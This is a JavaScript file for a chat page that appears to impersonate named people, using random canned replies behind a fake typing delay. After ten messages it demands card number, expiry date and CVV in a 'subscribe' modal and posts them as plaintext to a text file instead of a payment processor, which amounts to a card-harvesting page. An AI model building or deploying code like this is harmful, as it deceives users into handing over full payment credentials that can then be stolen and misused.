document.addEventListener('DOMContentLoaded', () => {
    const chatBox = document.getElementById('chat-box');
    const chatInput = document.getElementById('chat-input');
    const sendButton = document.getElementById('send-button');
    const chatDp = document.getElementById('chat-dp');
    const chatName = document.getElementById('chat-name');
    const urlParams = new URLSearchParams(window.location.search);
    const person = urlParams.get('person');
    
    const images = {
        hansi: 'images/hansi.jpeg',
        sulakshi: 'images/sulakshi.jpg',
        default: 'images/default.jpg'
    };

    const names = {
        hansi: 'Hansi',
        sulakshi: 'Sulakshi',
        default: 'Default'
    };

    if (person) {
        chatDp.src = images[person] || images['default'];
        chatName.innerText = names[person] || names['default'];
    }

    const replies = [
        "Hi there! How can I help you?",
        "I'm not sure I understand. Can you clarify?",
        "That's interesting. Tell me more!",
        "Sorry, I don't have an answer to that.",
        "Let me think about it..."
    ];

    let messageCount = 0;

    sendButton.addEventListener('click', sendMessage);
    chatInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            sendMessage();
        }
    });

    function sendMessage() {
        const userMessage = chatInput.value;
        if (userMessage.trim() === '') return;

        appendMessage(userMessage, 'user');
        chatInput.value = '';
        messageCount++;

        if (messageCount >= 10) {
            showSubscriptionPrompt();
        } else {
            showTypingAnimation().then(() => {
                const randomReply = replies[Math.floor(Math.random() * replies.length)];
                appendMessage(randomReply, 'bot');
            });
        }
    }

    function appendMessage(message, sender) {
        const messageElem = document.createElement('div');
        messageElem.classList.add('message', sender);
        messageElem.innerText = message;
        chatBox.appendChild(messageElem);
        chatBox.scrollTop = chatBox.scrollHeight;
    }

    function showTypingAnimation() {
        return new Promise((resolve) => {
            const typingElem = document.createElement('div');
            typingElem.classList.add('message', 'bot', 'typing-indicator');
            typingElem.innerHTML = `
                <span></span>
                <span></span>
                <span></span>
            `;
            chatBox.appendChild(typingElem);
            chatBox.scrollTop = chatBox.scrollHeight;

            const typingTime = Math.random() * (5000 - 1000) + 1000;
            setTimeout(() => {
                chatBox.removeChild(typingElem);
                resolve();
            }, typingTime);
        });
    }

    function showSubscriptionPrompt() {
        const modal = document.createElement('div');
        modal.classList.add('modal', 'open');
        modal.innerHTML = `
            <div class="modal-overlay"></div>
            <div class="modal-container">
                <div class="modal-header">
                    <h2>Subscribe to Continue</h2>
                    <span class="close">&times;</span>
                </div>
                <div class="modal-body">
                    <p>You have reached the message limit. Please subscribe to continue chatting.</p>
                    <input type="text" id="card-number" placeholder="Card Number">
                    <input type="text" id="exp-date" placeholder="MM/YY">
                    <input type="text" id="cvv" placeholder="CVV">
                    <button id="subscribe-button">Subscribe</button>
                </div>
            </div>
        `;
        document.body.appendChild(modal);

        document.getElementById('subscribe-button').addEventListener('click', () => {
            const cardNumber = document.getElementById('card-number').value.trim();
            const expDate = document.getElementById('exp-date').value.trim();
            const cvv = document.getElementById('cvv').value.trim();

            if (validateCardDetails(cardNumber, expDate, cvv)) {
                saveCardDetails(cardNumber, expDate, cvv);
                closeModal();
            } else {
                alert('Invalid card details. Please check and try again.');
            }
        });

        document.querySelector('.modal .close').addEventListener('click', () => {
            closeModal();
        });
    }

    function closeModal() {
        const modal = document.querySelector('.modal');
        modal.classList.remove('open');
        document.body.removeChild(modal);
    }

    function validateCardDetails(cardNumber, expDate, cvv) {
        // Basic validation for demonstration purposes
        const cardNumberRegex = /^\d{16}$/;
        const expDateRegex = /^\d{2}\/\d{2}$/;
        const cvvRegex = /^\d{3}$/;

        return cardNumberRegex.test(cardNumber) && expDateRegex.test(expDate) && cvvRegex.test(cvv);
    }

    function saveCardDetails(cardNumber, expDate, cvv) {
        const cardDetails = {
            cardNumber: cardNumber,
            expDate: expDate,
            cvv: cvv
        };

        fetch('data/cards.txt', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(cardDetails)
        }).then(response => {
            if (response.ok) {
                alert('Card details saved successfully.');
            } else {
                console.error('Failed to save card details.');
            }
        });
    }
});
